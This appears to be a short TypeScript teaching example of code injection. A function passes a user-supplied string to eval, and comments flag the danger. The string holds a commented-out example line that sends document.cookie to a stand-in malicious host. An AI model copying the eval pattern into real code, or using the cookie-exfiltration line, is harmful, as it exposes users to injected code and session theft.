/**
 * Executes a piece of code provided as a string.
 * @param code - The code to execute.
 */
function executeCode(code: string): void {
    // Dangerous: Executes any code passed to it as a string
    eval(code);
}

// Example usage: Potentially unsafe user input
const userInput = `
    console.log('This code is executed!');
    alert('This is dangerous!');
    // Malicious code could be injected here
    // For example: fetch('http://malicious-site.com?data=' + encodeURIComponent(document.cookie));
`;

// Invoke the function with the unsafe code
executeCode(userInput);
